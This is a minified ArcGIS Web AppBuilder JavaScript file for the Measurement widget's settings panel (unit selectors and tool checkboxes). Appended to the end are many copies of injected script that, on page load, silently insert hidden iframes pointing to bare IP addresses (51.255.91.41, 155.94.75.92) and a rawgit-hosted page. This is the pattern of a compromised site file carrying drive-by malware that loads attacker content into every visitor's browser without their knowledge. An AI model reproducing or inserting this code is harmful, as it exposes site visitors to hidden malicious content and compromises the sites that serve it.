// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"widgets/Measurement/setting/_build-generate_module":function(){define(["dojo/text!./Setting.html","dojo/text!./css/style.css","dojo/i18n!./nls/strings"],function(){})},"url:widgets/Measurement/setting/Setting.html":'\x3cdiv style\x3d"width:100%;height:100%;"\x3e\r\n    \x3ctable class\x3d"setting-table"\x3e\r\n      \x3ctbody\x3e\r\n        \x3ctr\x3e\r\n          \x3ctd\x3e${nls.defaultAreaUnit}\x3c/td\x3e\r\n          \x3ctd\x3e\r\n            \x3cdiv\x3e\r\n              \x3cselect class\x3d"opers" data-dojo-attach-point\x3d"selectAreaUnit" data-dojo-type\x3d"dijit/form/Select"\x3e\r\n                \x3coption value\x3d"esriAcres" selected\x3d"selected"\x3e${nls.acres}\x3c/option\x3e\r\n                \x3coption value\x3d"esriSquareMiles"\x3e${nls.sqMiles}\x3c/option\x3e\r\n                \x3coption value\x3d"esriSquareKilometers"\x3e${nls.sqKilometers}\x3c/option\x3e\r\n                \x3coption value\x3d"esriHectares"\x3e${nls.hectares}\x3c/option\x3e\r\n                \x3coption value\x3d"esriSquareYards"\x3e${nls.sqYards}\x3c/option\x3e\r\n                \x3coption value\x3d"esriSquareFeet"\x3e${nls.sqFeet}\x3c/option\x3e\r\n                \x3coption value\x3d"esriSquareFeetUS"\x3e${nls.sqFeetUS}\x3c/option\x3e\r\n                \x3coption value\x3d"esriSquareMeters"\x3e${nls.sqMeters}\x3c/option\x3e\r\n              \x3c/select\x3e\r\n            \x3c/div\x3e\r\n          \x3c/td\x3e\r\n        \x3c/tr\x3e\r\n        \x3ctr\x3e\r\n          \x3ctd\x3e${nls.defaultLengthUnit}\x3c/td\x3e\r\n          \x3ctd\x3e\r\n            \x3cdiv\x3e\r\n              \x3cselect class\x3d"opers" data-dojo-attach-point\x3d"selectLengthUnit" data-dojo-type\x3d"dijit/form/Select"\x3e\r\n                \x3coption value\x3d"esriMiles" selected\x3d"selected"\x3e${nls.miles}\x3c/option\x3e\r\n                \x3coption value\x3d"esriKilometers"\x3e${nls.kilometers}\x3c/option\x3e\r\n                \x3coption value\x3d"esriFeet"\x3e${nls.feet}\x3c/option\x3e\r\n                \x3coption value\x3d"esriFeetUS"\x3e${nls.feetUS}\x3c/option\x3e\r\n                \x3coption value\x3d"esriMeters"\x3e${nls.meters}\x3c/option\x3e\r\n                \x3coption value\x3d"esriYards"\x3e${nls.yards}\x3c/option\x3e\r\n                \x3coption value\x3d"esriNauticalMiles"\x3e${nls.nauticalMiles}\x3c/option\x3e\r\n              \x3c/select\x3e\r\n            \x3c/div\x3e\r\n          \x3c/td\x3e\r\n        \x3c/tr\x3e\r\n      \x3c/tbody\x3e\r\n    \x3c/table\x3e\r\n\r\n    \x3ctable class\x3d"setting-table"\x3e\r\n      \x3ctbody\x3e\r\n        \x3ctr\x3e\r\n          \x3ctd class\x3d"opers subtilte"\x3e${nls.showtools}\x3c/td\x3e\r\n        \x3c/tr\x3e\r\n        \x3ctr\x3e\r\n          \x3ctd\x3e\r\n            \x3cdiv class\x3d"showItems"\x3e\r\n              \x3cspan\x3e${nls.showArea}\x3c/span\x3e\r\n              \x3cdiv class\x3d"opers" data-dojo-type\x3d"jimu/dijit/CheckBox" data-dojo-attach-point\x3d"showArea"\x3e\x3c/div\x3e\r\n            \x3c/div\x3e\r\n\r\n            \x3cdiv class\x3d"showItems"\x3e\r\n              \x3cspan\x3e${nls.showDistance}\x3c/span\x3e\r\n              \x3cdiv class\x3d"opers" data-dojo-type\x3d"jimu/dijit/CheckBox" data-dojo-attach-point\x3d"showDistance"\x3e\x3c/div\x3e\r\n            \x3c/div\x3e\r\n\r\n            \x3cdiv class\x3d"showItems"\x3e\r\n              \x3cspan\x3e${nls.showLocation}\x3c/span\x3e\r\n              \x3cdiv class\x3d"opers" data-dojo-type\x3d"jimu/dijit/CheckBox" data-dojo-attach-point\x3d"showLocation"\x3e\x3c/div\x3e\r\n            \x3c/div\x3e\r\n          \x3c/td\x3e\r\n        \x3c/tr\x3e\r\n      \x3c/tbody\x3e\r\n    \x3c/table\x3e\r\n\x3c/div\x3e\r\n',
"url:widgets/Measurement/setting/css/style.css":".jimu-widget-measurement-setting{margin:0; padding:0; font-size:14px;}.jimu-widget-measurement-setting .dijitArrowButtonContainer{width: 17px;}.jimu-widget-measurement-setting .dijitSelect{height: 30px; width: 100%;}.jimu-widget-measurement-setting .setting-table \x3e thead \x3e tr \x3e th,.jimu-widget-measurement-setting .setting-table \x3e tbody \x3e tr \x3e td{height:34px; line-height:34px; vertical-align:middle;}.jimu-widget-measurement-setting .opers,.hideItems{margin-left: 6px; vertical-align: middle;}.jimu-widget-measurement-setting .showItems:first-child{margin-left: 0;}.jimu-widget-measurement-setting .showItems{display: inline-block; margin-left: 20px;}.jimu-widget-measurement-setting .showItems \x3e span{vertical-align: middle;}.jimu-widget-measurement-setting .subtilte{font-size:16px; padding-top: 10px;}",
"*now":function(e){e(['dojo/i18n!*preload*widgets/Measurement/setting/nls/Setting*["ar","bs","cs","da","de","en","el","es","et","fi","fr","he","hi","hr","id","it","ja","ko","lt","lv","nb","nl","pl","pt-br","pt-pt","ro","ru","sl","sr","sv","th","tr","zh-cn","vi","zh-hk","zh-tw","ROOT"]'])},"*noref":1}});
define("dojo/_base/declare dojo/_base/lang dojo/Deferred dijit/_WidgetsInTemplateMixin jimu/BaseWidgetSetting jimu/portalUtils esri/units dojo/on dijit/Tooltip dojo/mouse dijit/form/Select jimu/dijit/CheckBox".split(" "),function(e,b,h,k,l,m,c,g,d,n){return e([l,k],{baseClass:"jimu-widget-measurement-setting",startup:function(){this.inherited(arguments);this.config.measurement||(this.config.measurement={});this._showToolsItems=[];d.position="below";this._initShowToolItem(this.showArea);this._initShowToolItem(this.showDistance);
this._initShowToolItem(this.showLocation);this.setConfig(this.config)},_processConfig:function(a){var f=new h;a.defaultLengthUnit&&a.defaultAreaUnit?f.resolve(a):m.getUnits(this.appConfig.portalUrl).then(b.hitch(this,function(b){a.defaultAreaUnit="english"===b?c.SQUARE_MILES:c.SQUARE_KILOMETERS;a.defaultLengthUnit="english"===b?c.MILES:c.KILOMETERS;f.resolve(a)}));return f.promise},setConfig:function(a){this.config=a;this._processConfig(a).then(b.hitch(this,function(a){a.measurement.defaultAreaUnit?
this.selectAreaUnit.set("value",a.measurement.defaultAreaUnit):this.selectAreaUnit.set("value","esriAcres");a.measurement.defaultLengthUnit?this.selectLengthUnit.set("value",a.measurement.defaultLengthUnit):this.selectLengthUnit.set("value","esriMiles");"undefined"!==typeof a.showArea&&!1===a.showArea&&this.showArea.setValue(!1);"undefined"!==typeof a.showDistance&&!1===a.showDistance&&this.showDistance.setValue(!1);"undefined"!==typeof a.showLocation&&!1===a.showLocation&&this.showLocation.setValue(!1)}))},
getConfig:function(){this.config.measurement.defaultAreaUnit=this.selectAreaUnit.value;this.config.measurement.defaultLengthUnit=this.selectLengthUnit.value;this.config.showArea=this.showArea.checked;this.config.showDistance=this.showDistance.checked;this.config.showLocation=this.showLocation.checked;return this.config},_initShowToolItem:function(a){a&&(a.setValue(!0),this._showToolsItems.push(a),this.own(g(a,"change",b.hitch(this,this._onShowToolItemsChange,a))))},_onShowToolItemsChange:function(a){a&&
!1===a.checked&&this._isItemsAllHide()&&(a.check(),d.hide(),d.show(this.nls.allHidedTips,a.domNode),this.own(g.once(a.domNode,n.leave,b.hitch(this,function(){d.hide(a.domNode)}))))},_isItemsAllHide:function(){for(var a=0,b=this._showToolsItems.length;a<b;a++)if(!0===this._showToolsItems[a].checked)return!1;return!0}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});